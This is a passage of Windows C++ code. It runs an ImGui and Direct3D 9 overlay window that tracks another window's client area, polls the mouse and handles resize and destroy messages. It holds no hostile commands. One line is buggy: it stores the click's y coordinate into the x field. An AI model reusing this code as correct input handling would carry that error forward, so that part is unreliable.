		ZeroMemory(&xy, sizeof(POINT));
		GetClientRect(hwnd, &rc);
		ClientToScreen(hwnd, &xy);
		rc.left = xy.x;
		rc.top = xy.y;

		ImGuiIO& io = ImGui::GetIO();
		io.ImeWindowHandle = hwnd;
		io.DeltaTime = 1.0f / 60.0f;

		POINT p;
		GetCursorPos(&p);
		io.MousePos.x = p.x - xy.x;
		io.MousePos.y = p.y - xy.y;

		if (GetAsyncKeyState(VK_LBUTTON)) {
			io.MouseDown[0] = true;
			io.MouseClicked[0] = true;
			io.MouseClickedPos[0].x = io.MousePos.x;
			io.MouseClickedPos[0].x = io.MousePos.y;
		}
		else
			io.MouseDown[0] = false;

		if (rc.left != old_rc.left || rc.right != old_rc.right || rc.top != old_rc.top || rc.bottom != old_rc.bottom)
		{
			old_rc = rc;

			Width = rc.right;
			Height = rc.bottom;

			d3dpp.BackBufferWidth = Width;
			d3dpp.BackBufferHeight = Height;
			SetWindowPos(Window, (HWND)0, xy.x, xy.y, Width, Height, SWP_NOREDRAW);
			D3dDevice->Reset(&d3dpp);
		}
		render();
	}
	ImGui_ImplDX9_Shutdown();
	ImGui_ImplWin32_Shutdown();
	ImGui::DestroyContext();

	DestroyWindow(Window);
}

LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	if (ImGui_ImplWin32_WndProcHandler(hWnd, Message, wParam, lParam))
		return true;

	switch (Message)
	{
	case WM_DESTROY:
		PostQuitMessage(0);
		exit(4);
		break;
	case WM_SIZE:
		if (D3dDevice != NULL && wParam != SIZE_MINIMIZED)
		{
			ImGui_ImplDX9_InvalidateDeviceObjects();
			d3dpp.BackBufferWidth = LOWORD(lParam);
			d3dpp.BackBufferHeight = HIWORD(lParam);
			HRESULT hr = D3dDevice->Reset(&d3dpp);
			if (hr == D3DERR_INVALIDCALL)
				IM_ASSERT(0);
			ImGui_ImplDX9_CreateDeviceObjects();
		}
		break;
	default:
		return DefWindowProc(hWnd, Message, wParam, lParam);
		break;
	}
	return 0;
}
